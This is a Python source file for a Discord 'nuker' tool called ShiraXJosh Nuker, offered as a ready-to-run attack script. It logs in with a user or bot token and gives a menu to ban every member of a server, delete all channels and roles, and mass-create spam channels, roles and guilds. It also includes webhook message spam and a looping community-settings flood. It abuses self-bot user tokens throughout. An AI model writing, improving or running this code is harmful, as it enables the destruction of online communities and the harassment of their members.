import discord 
from discord.ext import commands
import os
import asyncio
import aiohttp
import requests
import random
from datetime import datetime
import threading
import itertools
import time, sys
from colorama import Fore


done = False

os.system('cls & title ShiraXJosh Nuker (0.0.1)')

def interface():
    for c in itertools.cycle(['|', '/', '-', '\\']):
        if done:
            break
            
        sys.stdout.write(c + '        loading\r')
        sys.stdout.flush()
        time.sleep(0.1)
    os.system('cls')
    
t = threading.Thread(target=interface)

t.start()

time.sleep(10)
done = True

os.system(f'cls & mode 80,15 & title Token Login')

token = input(f'Token: ')

now = datetime.now()
current_time = now.strftime("%H:%M:%S")
try:
    os.system('cls')
except:
    os.system('clear')

def check_token():
    if requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": f'{token}'}).status_code == 200:
        return "user"
    else:
        return "bot"



token_type = check_token()
intents = discord.Intents.all()

if token_type == "user":
    headers = {'Authorization': f'{token}'}
    client = commands.Bot(command_prefix=">", case_insensitive=False, self_bot=True, intents=intents)
elif token_type == "bot":
    headers = {'Authorization': f'Bot {token}'}
    client = commands.Bot(command_prefix=">", case_insensitive=False, intents=intents)
    
client.remove_command("help")

class ShiraXJosh:
    def __init__(self):
        self.member_count = 0
        self.channel_count = 0
        self.role_count = 0
        self.proxylist=[]
        self.webhook_url = []
        
        
        
    def guild_create(self, name):
        if token_type == "bot":
            return print("Client is a bot! Try a account token")
            
        elif token_type == "user":
            while True:
            
                session = requests.Session()
                r = session.post("https://discord.com/api/v9/guilds", headers=headers, json={'name': name})
                if r.status_code == 429:
                    retry = r.json()
                    print(f"[{current_time}] Ratelimited retrying in {retry['retry_after']}s ..")
                    time.sleep(retry['retry_after'])
                else:
                    if r.status_code in [200, 201, 204]:
                   
                        print(f"[{current_time}] Created Guild {name}")
                        break
                    else:
                        break
                        
                        
    async def CreateGuilds(self):
        name = input("Guild name: ")
        amount = input("Amount: ")
        for i in range(int(amount)):
            threading.Thread(target=self.guild_create, args=(name,)).start()
    
     
    def webhook_create(self, guild, channel, name):
        while True:
            session = requests.Session()
            r = session.post(f"https://discord.com/api/v9/channels/{channel}/webhooks", headers=headers, json={'name': name})
            if r.status_code == 429:
                retry = r.json()
                print(f"[{current_time}] Ratelimited retrying in {retry['retry_after']}s ..")
                time.sleep(retry['retry_after'])
            else:
                if r.status_code in [200, 201, 204]:
                   
                    print(f"[{current_time}] Created Webhook {name}")
                    break
                else:
                    break
                    
    def webhook_message(self, guild, url, content, name):
        while True:
            session = requests.Session()
            r = session.post(url, json={'content': content, 'username': name, 'avatar_url': 'https://media.discordapp.net/attachments/1010985094992896133/1021875108010262528/IMG_2056.png'})
            if r.status_code == 429:
                retry = r.json()
                print(f"[{current_time}] Ratelimited retrying in {retry['retry_after']}s ..")
                time.sleep(retry['retry_after'])
            else:
                if r.status_code in [200, 201, 204]:
                    print(f"[{current_time}] Sent Message {content}")
                    break
                else:
                    break
                    
    async def WebhookSpam(self):
        
        guild = input('Guild Id: ')
        name = input('Webhook name: ')
        web_count = input('Webhooks per channel: ')
        content = input('Message: ')
        msg_amount = input('Message amount: ')
        await client.wait_until_ready()
        guildOBJ = client.get_guild(int(guild))
        channels = guildOBJ.channels
        

        for channel in channels:
            for i in range(int(web_count)):
                threading.Thread(target=self.webhook_create, args=(guild, channel.id, name,)).start()
        time.sleep(1)
        for wh in await guildOBJ.webhooks():
            for i in range(int(msg_amount)):
                threading.Thread(target=self.webhook_message, args=(guild, wh.url, content, name,)).start()
        
     
    def disable_com(self, guild):
        a = {
            "description": None,
            "features": ["NEWS"],
            "preferred_locale": "en-US",
            "rules_channel_id": None,
            "public_updates_channel_id": None
        }
        try:
            r = requests.patch(f"https://discord.com/api/v9/guilds/{guild}", headers=headers, json=a)
            t = [200, 201, 204]
            if r.status_code in t:
                print(f"[{current_time}] Disabled Community")
            elif r.status_code == 429:
                b = r.json()
                print(f"[{current_time}] RateLimited, retrying in {b['retry_after']}s ..")
                time.sleep(b['retry_after'])
        except:
            pass     
        
    def enable_com(self, guild):
        a2 = {
            "features": ["COMMUNITY"],
            "preferred_locale": "en-US",
            "rules_channel_id": "1",
            "public_updates_channel_id": "1"
        }
        
        try:
            r = requests.patch(f"https://discord.com/api/v9/guilds/{guild}", headers=headers, json=a2)
            t = [200, 201, 204]
            if r.status_code in t:
                print(f"[{current_time}] Enabled Community")
            elif r.status_code == 429:
                b = r.json()
                print(f"[{current_time}] RateLimited, retrying in {b['retry_after']}s ..")
                time.sleep(b['retry_after'])
        except:
            pass
        
    def CommunityFlood(self, guild):
        a = {
            "description": None,
            "features": ["NEWS"],
            "preferred_locale": "en-US",
            "rules_channel_id": None,
            "public_updates_channel_id": None
        }
        a2 = {
            "features": ["COMMUNITY"],
            "preferred_locale": "en-US",
            "rules_channel_id": "1",
            "public_updates_channel_id": "1"
        }

        while True:
            try:
                r = requests.patch(f"https://discord.com/api/v9/guilds/{guild}", headers=headers, json=a2)
                t = [200, 201, 204]
                if r.status_code in t:
                    print(f"[{current_time}] Created Community")
                elif r.status_code == 429:
                    b = r.json()
                    print(f"[{current_time}] RateLimited, retrying in {b['retry_after']} seconds")
                    time.sleep(b['retry_after'])
            except:
                pass
            try:
                r = requests.patch(f"https://discord.com/api/v9/guilds/{guild}", headers=headers, json=a)
                t = [200, 201, 204]
                if r.status_code in t:
                    print(f"[{current_time}] Disabled Community")
                elif r.status_code == 429:
                    b = r.json()
                    print(f"[{current_time}] RateLimited, retrying in {b['retry_after']}s ..")
                    time.sleep(b['retry_after'])
            except:
                pass    
        
    async def community_settings(self):
        guild = input("Guild Id: ")
        try:
            os.system('cls & mode 90,20')
        except:
            os.system('clear')
            
        print("""
        
        1. Enable Community
        
        2. Disable Community
        
        3. Spam Community
        
        
        """)
        
        choice = input("Choose: ")
        if choice == "1" or choice == "one":
            threading.Thread(target=self.enable_com, args=(guild,)).start()
        elif choice == "2" or choice == "two":
            threading.Thread(target=self.disable_com, args=(guild,)).start()
        elif choice == "3" or choice == "three":
            for i in range(9):
                threading.Thread(target=self.CommunityFlood, args=(guild,)).start()
        
       
    def create_role(self, guild, name):
        while True:
            json = {
                'name': name
            }
            session = requests.Session()
            r = session.post(f"https://discord.com/api/v9/guilds/{guild}/roles", headers=headers, json=json)
            if r.status_code == 429:
                retry = r.json()
                print(f"[{current_time}] Ratelimited retrying in {retry['retry_after']}s ..")
                time.sleep(retry['retry_after'])
            else:
                if r.status_code in [200, 201, 204]:
                    print(f"[{current_time}] Created Role {name}")
                    break
                else:
                    break
    
    async def SpamRoles(self):
        guild = input("Guild Id: ")
        name = input("Role name: ")
        amount = input("Amount: ")
        for i in range(int(amount)):
            threading.Thread(target=self.create_role, args=(guild, name)).start()
                    
    def create_chan(self, guild, name, type:int):
        while True:
            json = {
                'name': name,
                'type': type
            }
            session = requests.Session()
            r = session.post(f"https://discord.com/api/v9/guilds/{guild}/channels", headers=headers, json=json)
            if r.status_code == 429:
                retry = r.json()
                print(f"[{current_time}] Ratelimited retrying in {retry['retry_after']}s ..")
                time.sleep(retry['retry_after'])
            else:
                if r.status_code in [200, 201, 204]:
                    print(f"[{current_time}] Created Channel {name}")
                    break
                else:
                    break
                    
    def text_chan(self, guild, name):
        while True:
            json = {
                'name': name,
                'type': 0
            }
            session = requests.Session()
            r = session.post(f"https://discord.com/api/v9/guilds/{guild}/channels", headers=headers, json=json)
            if r.status_code == 429:
                retry = r.json()
                print(f"[{current_time}] Ratelimited retrying in {retry['retry_after']}s ..")
                time.sleep(retry['retry_after'])
            else:
                if r.status_code in [200, 201, 204]:
                    print(f"[{current_time}] Created Channel {name}")
                    break
                else:
                    break
                    
                    
                    
    async def SpamChannels(self):
        guild = input("Guild Id:  ")
        name = input("Channel Names: ")
        try:
            os.system('cls & mode 90,20')
        except:
            os.system('clear')
            
        print("""
        
        Channel Types        |       Type       
        -----------------    |     --------
        Text Channels        |        0
        -----------------    |     --------
        Voice Channels       |        2
        -----------------    |     -------- 
        Category Channels    |        4
        -----------------    |     --------
        Annoucement Guild    |        5
        -----------------    |     --------
        Stage Channels       |        13
        -----------------    |     --------
        Forum Channels       |        15
        -----------------    |     --------
        """)
        type = 0
        ty = input("Channel Type:  ")
        amount = input("Amount: ")
        if ty == None or ty == "0":
            type = 0
        elif ty == "2":
            type = 2
        elif ty == "4":
            type = 4
        elif ty == "5":
            type = 5
        elif ty == "13":
            type = 13
        elif ty == "15":
            type = 15
        
        for i in range(int(amount)):
            threading.Thread(target=self.create_chan, args=(guild, name, type,)).start()

    def del_role(self, guild, role):
        while True:
            session = requests.Session()
            r = session.delete(f"https://discord.com/api/v9/guilds/{guild}/roles/{role}", headers=headers)
            if r.status_code == 429:
                retry = r.json()
                print(f"[{current_time}] Ratelimited retrying in {retry['retry_after']}s ..")
                time.sleep(retry['retry_after'])
            else:
                if r.status_code in [200, 201, 204]:
                    print(f"[{current_time}] Deleted Role {role}")
                    break
                else:
                    break
    
    async def deleteRoles(self):
        guild = input("Guild Id: ") 
        await client.wait_until_ready()
        guildOBJ = client.get_guild(int(guild))
        roles = guildOBJ.roles
        for role in roles:
            threading.Thread(target=self.del_role, args=(guild, role.id,)).start()        
        
    def ban_mem(self, guild, member):
        session = requests.Session()
        while True:
            now = datetime.now()
            current_time = now.strftime("%H:%M:%S")
            r = session.put(f"https://discord.com/api/v9/guilds/{guild}/bans/{member}", headers=headers)
            if r.status_code == 429:
                retry = r.json()
                print(f"[{current_time}] Ratelimited retrying in {retry['retry_after']}s ..")
                time.sleep(retry['retry_after'])
            else:
                if r.status_code in [200, 201, 204]:
                    print(f"[{current_time}] Banned {member}")
                    break
                else:
                    break
    
    async def banAll(self):
        guild = input('Guild Id: ')
        await client.wait_until_ready()
        guildOBJ = client.get_guild(int(guild))
        members = guildOBJ.members
        for member in members:
            threading.Thread(target=self.ban_mem, args=(guild, member.id,)).start()       
        
    def del_chan(self, guild, channel):
        session = requests.Session()
        while True:
            now = datetime.now()
            current_time = now.strftime("%H:%M:%S")
            r = session.delete(f"https://discord.com/api/v9/channels/{channel}", headers=headers)
            if r.status_code == 429:
                retry = r.json()
                print(f"[{current_time}] Ratelimited retrying in {retry['retry_after']}s ..")
                time.sleep(retry['retry_after'])
            else:
                if r.status_code in [200, 201, 204]:
                    print(f"[{current_time}] Deleted Channel {channel}")
                    break
                else:
                    break
                    
    async def deleteChannels(self):
        guild = input('Guild Id: ')
        await client.wait_until_ready()
        guildOBJ = client.get_guild(int(guild))
        channels = guildOBJ.channels
        for channel in channels:
            threading.Thread(target=self.del_chan, args=(guild, channel.id,)).start()
            
    async def NukeServer(self):
        guild = input("Guild Id: ")
        channel_name = input("Channel name: ")
        channel_amount = input("Channel amount: ")
        role_name = input("Role name: ")
        role_amount = input("Role amount: ")
        await client.wait_until_ready()
        guildOBJ = client.get_guild(int(guild))
        channels = guildOBJ.channels
        roles = guildOBJ.roles
        members = guildOBJ.members
        
        for channel in channels:
            threading.Thread(target=self.del_chan, args=(guild, channel.id,)).start()
        for member in members:
            threading.Thread(target=self.ban_mem, args=(guild, member.id,)).start()
        for role in roles:
            threading.Thread(target=self.del_role, args=(guild, role.id,)).start()
        for i in range(int(channel_amount)):
            threading.Thread(target=self.text_chan, args=(guild, channel_name,)).start()
        for i in range(int(role_amount)):
            threading.Thread(target=self.create_role, args=(guild, role_name,)).start()
        
        
        
    
            
    async def Menu(self):
        os.system(f'cls & mode 80,16 & title  [ShiraXJosh] Connected with {client.user}')
        print('''
 
                                             [x] Exit
                  \ / .         
     _ |_  .  _ _  X  | _  _ |_ 
    _> | | | | (_|/ \_|(_)_> | |              
        ''')
        print('''
            
         1. Ban All               2. Delete Channels    
         3. Delete Roles          4. Create Channels
         5. Create Roles          6. Community Settings
         7. Nuke Server           8. Create Guilds
        

        ''')
        choice = input("Choose : ")
        if choice == "1" or choice == "one":
            await self.banAll()
            await asyncio.sleep(2)
            await self.Menu()
            
        elif choice == "2" or choice == "two":
            await self.deleteChannels()
            await asyncio.sleep(2)
            await self.Menu()
            
            
        elif choice == "4" or choice == "four":
            await self.SpamChannels()
            await asyncio.sleep(2)
            await self.Menu()
            
        elif choice == "3" or choice == "three":
            await self.deleteRoles()
            await asyncio.sleep(2)
            await self.Menu()
            
        elif choice == "5" or choice == "five":
            await self.SpamRoles()
            await asyncio.sleep(2)
            await self.Menu()
            
        elif choice == "6" or choice == "six":
            await self.community_settings()
            await asyncio.sleep(2)
            await self.Menu()
            
        elif choice == "7" or choice == "seven":
            await self.NukeServer()
            await asyncio.sleep(2)
            await self.Menu()
            
        elif choice == "8" or choice == "eight":
            await self.CreateGuilds()
            await asyncio.sleep(3)
            await self.Menu()
            
        elif choice == "X" or choice == "x":
            os._exit(0)
    
    @client.event
    async def on_ready():
        await ShiraXJosh().Menu()
    
    def startup(self):
        try:
            if token_type == "user":
                client.run(token, bot=False)
            elif token_type == "bot":
                client.run(token)
            
        except:
            print(f'Invalid Token')
            input()
            time.sleep(2)
            os._exit(0)
            
if __name__ == "__main__":
    ShiraXJosh().startup()
        